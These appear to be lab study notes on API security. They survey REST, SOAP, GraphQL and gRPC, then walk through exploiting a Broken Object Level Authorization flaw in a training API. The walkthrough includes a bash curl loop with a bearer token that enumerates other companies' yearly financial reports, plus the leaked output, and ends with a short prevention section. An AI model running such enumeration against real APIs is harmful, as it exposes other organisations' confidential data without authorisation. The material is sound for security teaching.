# API Attacks - OWASP Top 10

## Introduction

### API Building Styles

Web APIs can be built using various architectural styles, including REST, SOAP, GraphQL, and gRPC, each with its own strengths and use cases:

- **Representational State Transfer (_REST_)** is the most popular API style. It uses a client-server model where clients make requests to resources on a server using standard HTTP methods. RESTful APIs are stateless, meaning each request contains all necessary information for the server to process it, and responses are typically serialized as JSON or XML.
- **Simple Object Access Protocol (_SOAP_)** uses XML for message exchange between systems. SOAP APIs are highly standardized and offer comprehensive features for security, transactions, and error handling, but they are generally more complex to implement and use then RESTful APIs.
- **GraphQL** is an alternative style that provides a more flexible and efficient way to fetch and update data. Instead of returning a fixed set of fields for each resource, GraphQL allows clients to specify exactly what data they need, reducing over-fetching and under-fetching of data. GraphQL APIs use a single endpoint and strongly-typed query language to retrieve data.
- **gRPC** is a newer style that uses Protocol Buffers for message serialization, providing a high-performance, efficient way to communicate between systems. gRPC APIs can be developed in a variety of programming languages and are particularly useful for microservices and distributed systems.

## OWASP Top 10

### Broken Object Level Authorization

Web APIs allow users to request data or records by sending various parameters, including unique identifiers such as Universally Unique Identifiers (_UUIDs_), also known as Globally Unique Identifiers (_GUIDs_), and integer IDs. However, failing to properly and securely verify that a user has ownership and permission to view a specific resource through object-level authorization mechanisms can lead to data exposure and security vulns.

A web API endpoint is vulnerable to Broken Object Level Authorization, also known as Insecure Direct Object Reference, if its authorization checks fail to correctly ensure that an authenticated user has sufficient permissions or privileges to request and view specific data or perform certain operations.

#### [Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)

Using the `/api/v1/authentication/suppliers/sign-in` sign in and obtain a JWT:

![api owasp 1](../../../../images/api_owasp1.gif)

To authenticate using the JWT, you will copy it from the response and click the `Authorize` button. Note the lock icon, currently unlocked, indicating your non-authenticated status. Next, you will paste the JWT into the `Value` text field within the `Available authorizations` popup and click `Authorize`. Upon completion, the lock icon will be fully locked, confirming your authentication.

![api owasp 2](../../../../images/api_owasp2.gif)

When examining the endpoints within the Suppliers group, you will notice one named `/api/v1/suppliers/current-user`:

![api owasp 3](../../../../images/api_owasp3.png)

Endpoints containing `current-user` in their path indicate that they utilize the JWT of the currently authenticated user to perform the specified operation, which in this case is retrieving the current user's data. Upon invoking the endpoint, you will retrieve your current user's company ID, `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`, a GUID value:

![api owasp 4](../../../../images/api_owasp4.png)

Then retrieve your current user's roles. After invoking the `/api/v1/roles/current-user` endpoint, it responds with the role `SupplierCompanies_GetYearlyReportByID`:

![api owasp 5](../../../../images/api_owasp5.png)

In the `Supplier-Companies` group, you find an endpoint related to the role `SupplierCompanies_GetYearlyReportByID` that accepts a GET parameter: `/api/v1/supplier-companies/yearly-reports/{ID}`:

![api owasp 6](../../../../images/api_owasp6.png)

When expanding it, you will notice that it requires the `SupplierCompanies_GetYearlyReportByID` role and accepts the ID parameter as an integer and not a GUID:

![api owasp 7](../../../../images/api_owasp7.png)

If you use 1 as the ID, you will receive a yearly-report belonging to a company with the ID `f9e58492-b594-4d82-a4de-16e4f230fce1`, which is not the one you belong to, `b75a7c76-e149-4ca7-9c55-d9fc4ffa87be`:

![api owasp 8](../../../../images/api_owasp8.png)

When trying other IDs, you still can access yearly reports of other supplier-companies, allowing you to access potentially sensitive business data:

![api owasp 9](../../../../images/api_owasp9.png)

Additionally, you can mass abuse the BOLA vuln and fetch the first 20 yearly reports of supplier-companies:

![api owasp 10](../../../../images/api_owasp10.gif)

The only changes you need to make to the copied cURL command from the Swagger interface are using a Bash for-loop with variable interpolation, adding a new line after each response using the flag `-w "\n"`, silencing progress using the `-s` flag, and piping the output to jq.

```bash
d41y@htb[/htb]$ for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.49.212:43104/api/v1/supplier-companies/yearly-reports/'$i'' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjFAcGVudGVzdGVyY29tcGFueS5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOiJTdXBwbGllckNvbXBhbmllc19HZXRZZWFybHlSZXBvcnRCeUlEIiwiZXhwIjoxNzIwMTg1NzAwLCJpc3MiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiJ9.D6E5gJ-HzeLZLSXeIC4v5iynZetx7f-bpWu8iE_pUODlpoWdYKniY9agU2qRYyf6tAGdTcyqLFKt1tOhpOsWlw' | jq
done

{
  "supplierCompanyYearlyReport": {
    "id": 1,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2020,
    "revenue": 794425112,
    "commentsFromCLevel": "Superb work! The Board is over the moon! All employees will enjoy a dream vacation!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 2,
    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
    "year": 2022,
    "revenue": 339322952,
    "commentsFromCLevel": "Excellent performance! The Board is exhilarated! Prepare for a special vacation adventure!"
  }
}
{
  "supplierCompanyYearlyReport": {
    "id": 3,
    "companyID": "058ac1e5-3807-47f3-b546-cc069366f8f9",
    "year": 2020,
    "revenue": 186208503,
    "commentsFromCLevel": "Phenomenal performance! The Board is deeply impressed! Everyone will be treated to a deluxe vacation!"
  }
}

<SNIP>
```

#### Prevention

To mitigate the BOLA vuln, the endpoint `/api/v1/supplier-companies/yearly-reports` should implement a verification step to ensure that authorized users can only access yearly reports associated with their affiliated company. This verification involves comparing the `companyID` field of the report with the authenticated supplier's `companyID`. Access should be granted only if these values match; otherwise, the request should be denied. This approach effectively maintains data segregation between supplier-companies' yearly reports.

